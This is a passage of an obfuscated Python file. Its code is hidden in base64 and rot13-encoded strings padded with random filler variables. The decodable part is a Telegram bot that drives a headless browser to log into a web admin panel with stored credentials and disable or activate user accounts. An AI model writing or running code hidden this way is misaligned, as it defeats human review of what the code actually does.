xACGH1OGxDtXlq0WlxwoTyhMGb2Amcvpz93p2IlYzMcozEsMJkyoJIhqS9vrI90LJqsozSgMFtaLz9xrFpcYaAyozEsn2I5pluY'
god = 'ZXlzLkNPTU1BTkQgKyAndCcpCiAgICBPME8wME8wMDAwME9PME9PTyAuZ2V0IChVUkxfMiApI2xpbmU6Njk6YnJvd3Nlci5nZXQoVVJMXzIpCiAgICB0aW1lIC5zbGVlcCAoMiApI2xpbmU6NzE6dGltZS5zbGVlcCgyKQogICAgT08wT08wME9PME9PME8wTzAgPU9PTzAwT09PT09PT08wME9PIC5hcmdzIFswIF0jbGluZTo3MzpkaXNhYmxldXNlciA9IGNvbnRleHQuYXJnc1swXQogICAgcHJpbnQgKCIoLy9CVVRUT05bQHJvbGU9J3N3aXRjaCddKVsiK09PME9PMDBPTzBPTzBPME8wICsiXSIpI2xpbmU6NzU6cHJpbnQoIigvL0JVVFRPTltAcm9sZT0nc3dpdGNoJ10pWyIrIGRpc2FibGV1c2VyICsiXSIpCiAgICBPMDBPME8wTzBPTzAwTzBPTyA9TzBPMDBPMDAwMDBPTzBPT08gLmZpbmRfZWxlbWVudF9ieV94cGF0aCAoIigvL0JVVFRPTltAcm9sZT0nc3dpdGNoJ10pWyIrT08wT08wME9PME9PME8wTzAgKyJdIikjbGluZTo3ODpsaW5rYmFyNSA9IGJyb3dzZXIuZmluZF9lbGVtZW50X2J5X3hwYXRoKCIoLy9CVVRUT05bQHJvbGU9J3N3aXRjaCddKVsiKyBkaXNhYmxldXNlciArIl0iKQogICAgTzAwTzBPME8wT08wME8wT08gLmNsaWNrICgpI2xpbmU6Nzk6bGlua2JhcjUuY2xpY2soKQogICAgdGltZSAuc2xlZXAgKDEgKSNsaW5lOjgwOnRpbWUuc2xlZXAoMSkKICAgIGlmIE8wME8wTzBPME9PMDBPME9PIDojbGluZTo4MjppZiBsaW5rYmFyNToKICAgICAgICBPT08wME9PT09PT09PMDBPTyAuYm90IC5zZW5kX21lc3NhZ2UgKGNoYXRfaWQgPU9PMDBPMDBPT08wME9PT09PIC5tZXNzYWdlIC5jaGF0X2lkICx0ZXh0ID1mJ+KchSBVc2VyIHtPTzBPTzAwT08wT08wTzBPMH0gU3VjY2Vzc2Z1bGx5IGRpc2FibGVkIOKchScpI2xpbmU6ODM6Y29udGV4dC5ib3Quc2VuZF9tZXNzYWdlKGNoYXRfaWQ9dXBkYXRlLm1lc3NhZ2UuY2hhdF9pZCwgdGV4dD1mJ+KchSBVc2VyIHtkaXNhYmxldXNlcn0gU3VjY2Vzc2Z1bGx5IGRpc2FibGVkIOKchScpCiAgICBlbHNlIDojbGluZTo4NTplbHNlIDoKICAgICAgICBPT08wME9PT09PT09PMDBPTyAuYm90IC5zZW5kX21lc3NhZ2UgKGNoYXRfaWQgPU9PMDBPMDBPT08wME9PT09PIC5tZXNzYWdlIC5jaGF0X2lkICx0ZXh0ID1mJ+KaoO+4jyBGYWlsZWQgdG8gZGlzYWJsZSB7T08wT08wME9PME9PME8wTzB9IHVzZXIg4pqg77iPJykjbGluZTo4Njpjb250ZXh0LmJvdC5zZW5kX21lc3NhZ2UoY2hhdF9pZD11cGRhdGUubWVzc2FnZS5jaGF0X2lkLCB0ZXh0PWYn4pqg77iPIEZhaWxlZCB0byBkaXNhYmxlIHtkaXNhYmxldXNlcn0gdXNlciDimqDvuI8nKQogICAgTzBPMDBPMDAwMDBPTzBPT08gLmNsb3NlICgpI2xpbmU6ODk6YnJvd3Nlci5jbG9zZSgpCkByZXN0cmljdGVkICNsaW5lOjkxOkByZXN0cmljdGVkCkBydW5fYXN5bmMgI2xpbmU6OTI6QHJ1bl9hc3luYwpkZWYgb24gKE9PMDAwT09PTzBPMDBPMDAwICxPT08wTzBPME9PTzBPME9PTyApOiNsaW5lOjkzOmRlZiBvbih1cGRhdGUsIGNvbnRleHQpOgogICAgT09PME8wTzBPT08wTzBPT08gLmJvdCAuc2VuZF9tZXNzYWdlIChjaGF0X2lkID1PTzAwME9PT08wTzAwTzAwMCAubWVzc2FnZSAuY2hhdF9pZCAsdGV4dCA9c3RyaW5nIC5hdHN1ICkjbGluZTo5NTpjb250ZXh0LmJvdC5zZW5kX21lc3NhZ2UoY2hhdF9pZD11cGRhdGUubWVzc2FnZS5jaGF0X2lkLCB0ZXh0PXN0cmluZy5hdHN1KQogICAgT08wME8wTzAwTzBPME8wT08gPXdlYmRyaXZlciAuQ2hyb21lT3B0aW9ucyAoKSNsaW5lOjk3OmNocm9tZV9vcHRpb25zID0gd2ViZHJpdmVyLkNocm9tZU9wdGlvbnMoKQogICAgT08wME8wTzAwTzBPME8wT08gLmJpbmFyeV9sb2NhdGlvbiA9b3MgLmVudmlyb24gLmdldCAoIkdPT0dMRV9DSFJPTUVfQklOIikjbGluZTo5ODpjaHJvbWVfb3B0aW9ucy5iaW5hcnlfbG9jYXRpb24gPSBvcy5lbnZpcm9uLmdldCgiR09PR0xFX0NIUk9NRV9CSU4iKQogICAgT08wME8wTzAwTzBPME8wT08gLmFkZF9hcmd1bWVudCAoIi0taGVhZGxlc3MiKSNsaW5lOjk5OmNocm9tZV9vcHRpb25zLmFkZF9hcmd1bWVudCgiLS1oZWFkbGVzcyIpCiAgICBPTzAwTzBPMDBPME8wTzBPTyAuYWRkX2FyZ3VtZW50ICgiLS1kaXNhYmxlLWRldi1zaG0tdXNhZ2UiKSNsaW5lOjEwMDpjaHJvbWVfb3B0aW9ucy5hZGRfYXJndW1lbnQoIi0tZGlzYWJsZS1kZXYtc2htLXVzYWdlIikKICAgIE9PMDBPME8wME8wTzBPME9PIC5hZGRfYXJndW1lbnQgKCItLW5vLXNhbmRib3giKSNsaW5lOjEwMTpjaHJvbWVfb3B0aW9ucy5hZGRfYXJndW1lbnQoIi0tbm8tc2FuZGJveCIpCiAgICBPTzAwME9PTzBPME9PT08wTyA9d2ViZHJpdmVyIC5DaHJvbWUgKGV4ZWN1dGFibGVfcGF0aCA9b3MgLmVudmlyb24gLmdldCAoIkNIUk9NRURSSVZFUl9QQVRIIiksb3B0aW9ucyA9T08wME8wTzAwTzBPME8wT08gKSNsaW5lOjEwMjpicm93c2VyID0gd2ViZHJpdmVyLkNocm9tZShleGVjdXRhYmxlX3BhdGg9b3MuZW52aXJvbi5nZXQoIkNIUk9NRURSSVZFUl9QQVRIIiksIG9wdGlvbnM9Y2hyb21lX29wdGlvbnMpCiAgICBPTzAwME9PTzBPME9PT08wTyAuZ2V0IChVUkxfMSApI2xpbmU6MTAzOmJyb3dzZXIuZ2V0KFVSTF8xKQogICAgTzBPT08wMDAwMDAwTzBPME8gPU9PMDAwT09PME8wT09PTzBPIC5maW5kX2VsZW1lbnRfYnlfeHBhdGggKCcvL2lucHV0W0BwbGFjZWhvbGRlcj0idXNlcm5hbWUiXScpI2xpbmU6MTA1OnVzZXIgPSBicm93c2VyLmZpbmRfZWxlbWVudF9ieV94cGF0aCgnLy9pbnB1dFtAcGxhY2Vob2xkZXI9InVzZXJuYW1lIl0nKQogICAgTzBPT08wMDAwMDAwTzBPME8gLnNlbmRfa2V5cyAoc3RyaW5nIC5wc3cgKSNsaW5lOjEwNjp1c2VyLnNlbmRfa2V5cyhzdHJpbmcucHN3KQogICAgT08wME8wTzBPME8wME9PMDAgPU9PMDAwT09PME8wT09PTzBPIC5maW5kX2VsZW1lbnRfYnlfeHBhdGggKCcvL2lucHV0W0BwbGFjZWhvbGRlcj0icGFzc3dvcmQiXScpI2xpbmU6MTA4OnBhc3N3ID0gYnJvd3Nlci5maW5kX2VsZW1lbnRfYnlfeHBhdGgoJy8vaW5wdXRbQHBsYWNlaG9sZGVyPSJwYXNzd29yZCJdJykKICAgIE9PMDBPME8wTzBPMDBPTzAwIC5zZW5kX2tleXMgKHN0cmluZyAucHN3ICkjbGluZToxMDk6cGFzc3cuc2VuZF9rZXlzKHN0cmluZy5wc3cpCiAgICBPMDBPMDBPT09PT08wME9PTyA9T08wMDBPT08wTzBPT09PME8gLmZpbmRfZWxlbWVudF9ieV94cGF0aCAoJy8vYnV0dG9uW0BjbGFzcz0iYW50LWJ0biBhbnQtYnRuLWJsb2NrIl0nKSNsaW5lOjExMTpsaW5rYmFyID0gYnJvd3Nlci5maW5kX2VsZW1lbnRfYnlfeHBhdGgoJy8vYnV0dG9uW0BjbGFzcz0iYW50LWJ0biBhbnQtYnRuLWJsb2NrIl0nKQogICAgTzAwTzAwT09PT09PMDBPT08gLmNsaWNrICgpI2xpbmU6MTEyOmxpbmtiYXIuY2xpY2soKQogICAgdGltZSAuc2xlZXAgKDEgKSNsaW5lOjExMzp0aW1lLnNsZWVwKDEpCiAgICBPTzAwME9PTzBPME9PT08wTyAuZmluZF9lbGVtZW50X2J5X3RhZ19uYW1lICgnYm9keScpLnNlbmRfa2V5cyAoS2V5cyAuQ09NTUFORCArJ3QnKSNsaW5lOjExNTpicm93c2VyLmZpbmRfZWxlbWVudF9ieV90YWdfbmFtZSgnYm9keScpLnNlbmRfa2V5cyhLZXlzLkNPTU1BTkQgKyAndCcpCiAgICBPTzAwME9PTzBPME9PT08wTyAuZ2V0IChVUkxfMiApI2xpbmU6MTE3OmJyb3dzZXIuZ2V0KFVSTF8yKQogICAgdGltZSAuc2xlZXAgKDIgKSNsaW5lOjExOTp0aW1lLnNsZWVwKDIpCiAgICBPT09PT09PT08wMDBPME9PMCA9T09PME8wTzBPT08wTzBPT08gLmFyZ3MgWzAgXSNsaW5lOjEyMTpkaXNhYmxldXNlciA9IGNvbnRleHQuYXJnc1swXQogICAgcHJpbnQgKCIoLy9CVVRUT05bQHJvbGU9J3N3aXRjaCddKVsiK09PT09PT09PTzAwME8wT08wICsiXSIpI2xpbmU6MTIzOnByaW50KCIoLy9CVVRUT05bQHJvbGU9J3N3aXRjaCddKVsiKyBkaXNhYmxldXNlciArIl0iKQogICAgT09PTzBPT09PT08wMDAwMDAgPU9PMDAwT09PME8wT09PTzBPIC5maW5kX2VsZW1lbnRfYnlfeHBhdGggKCIoLy9CVVRUT05bQHJvbGU9J3N3aXRjaCddKVsiK09PT09PT09PTzAwME8wT08wICsiXSIpI2xpbmU6MTI2OmxpbmtiYXI1ID0gYnJvd3Nlci5maW5kX2VsZW1lbnRfYnlfeHBhdGgoIigvL0JVVFRPTltAcm9sZT0nc3dpdGNoJ10pWyIrIGRpc2FibGV1c2VyICsiXSIpCiAgICBPT09PME9PT09PTzAwMDAwMCAuY2xpY2sgKCkjbGluZToxMjc6bGlua2JhcjUuY2xpY2soKQogICAgdGltZSAuc2xlZXAgKDEgKSNsaW5lOjEyODp0aW1lLnNsZWVwKDEpCiAgICBpZiBPT09PME9PT09PTzAwMDAwMCA6I2xpbmU6MTMwOmlmIGxpbmtiYXI1OgogICAgICAgIE9PTzBPME8wT09PME8wT09PIC5ib3QgLnNlbmRfbWVzc2FnZSAoY2hhdF9pZCA9T08wMDBPT09PME8wME8wMDAgLm1lc3NhZ2UgLmNoYXRfaWQgLHRleHQgPWYn4pyFIFVzZXIge09PT09PT09PTzAwME8wT08wfSBTdWNjZXNzZnVsbHkgQWN0aXZhdGUg4pyFJykjbGluZToxMzE6Y29udGV4dC5ib3Quc2VuZF9tZXNzYWdlKGNoYXRfaWQ9dXBkYXRlLm1lc3NhZ2UuY2hhdF9pZCwgdGV4dD1mJ+KchSBVc2VyIHtkaXNhYmxldXNlcn0gU3VjY2Vzc2Z1bGx5IEFjdGl2YXRlIOKchScpCiAgICBlbHNlIDojbGluZToxMzM6ZWxzZSA6CiAgICAgICAgT09PME8wTzBPT08wTzBPT08gLmJvdCAuc2VuZF9tZXNzYWdlIChjaGF0X2lkID1PTzAwME9PT08wTzAwTzAwMCAubWVzc2FnZSAuY2hhdF9pZCAsdGV4dCA9ZifimqDvuI8gRmFpbGVkIHRvIEFjdGl2YXRlIHtPT09PT09PT08wMDBPME9PMH0gdXNlciDimqDvuI8nKSNsaW5lOjEzNDpjb250ZXh0LmJvdC5zZW5kX21lc3NhZ2UoY2hhdF9pZD11cGRhdGUubWVzc2FnZS5jaGF0X2lkLCB0ZXh0PWYn4pqg77iPIEZhaWxlZCB0byBBY3RpdmF0ZSB7ZGlzYWJsZXVzZXJ9IHVzZXIg4pqg77iPJykKICAgIE9PMDAwT09PME8wT09PTzBPIC5jbG9zZSAoKSNsaW5lOjEzNzpicm93c2VyLmNsb3NlKCkKSyA9ICJldkR5UXFlYmhoUWNlellxS25JUW9LT0tSYURCbVFCdGVnTllDdlhEQXZUSlJCT3BaRUV1SmVTaXJtckpSaE9kRlF1WkJaZHNvTXpiQWFyIgpuRWl0R3NtdFlHU2p3WEJKb3VVeGZPVkdiZnRORkhvVmdGdHlpT09iTEJOT2RCb3l1eGJtQ0ZVWUdNS2ZXdUVqT1FlcHd2SVVpVWVhUU1QMyA9IDI3MApsSWxJSSA9ICJnc2x4RmhOZ3ZUSHp0ZXlXWlV2Q1VEdlhhYWlzSUVVYnpRWElVYmhtbFlLVnpCb0pCZkl3QkVuckZXUEhqUFZkTEpYdlVnYVZ5cUpyS2ZpIgphQUFBQWFhID0gMzk3Cm85ID0gNzU2CkN1UFFYWGRwZnpFUU5CREdmU0lJR05JSHB5ZmRyY1FzYmhTdnhnYmxXQmxsRFVRaVlFZUtrUE16YmN0Zkh1YWZFZ2RabEd3YUVFa3BSelMxMSA9ICJ1QnlaQkZ4S2VZdEVOVWpiSEVyR0d3WFlaUHptVXNGZG1EaEFGS2xSVVhUaXFmTll0RkZ0b0VQV2FOUGJnWkRCRFpCYWdNUm1VcEhKUEpaIgpuMTMgPSAicUdxWmZ5cEFGcWJma0d3RlBCU3p2U1lmQXhiTXVZaXZSTlJjd2hvWGxnR0hzbEVaeGxIU2ZvcnVUVEZwUGxNV2pKQkh5a2trZEVuemFjWCIKQWFhYWFhYUFBQUFBYUFhID0gInRXZXppb2toWFNkS3FrQ09YaEN4VlhabnNhd0x5VkJ0T05NWFZXSlRqc3hFenl3ZE9XaUFReEJMZnJzU3ZQT0RkZ2tuZ29KbElPTGdyTFoiClkxNyA9IDc3NwpJbGxJbElsSUlsbElJSUlJbElJID0gNzg4CklJSWxsSWxsbGxJbElsSUlJSWxsbCA9ICJQZWlPUExDdWZEckJqdnltUmlIVXpVSFpHSnFDbHl0aG5kSENBcGhmdEtiTWxwbW1xWkhteEVGdGJ4SFFKTEFtdEFHVkdQQUpoaG1mV0lCIgpzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3NzcyA9IDM1NApBYUFhQWFhYWFBQWFBYWFhYWFBYWFBQWFBID0gIkVFWHJFSWxhY25xU2tnZHptSlBWV0hlRnBjSEFnR2RQem5ESVVLUnNOTnJiSFNYblVYeU'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
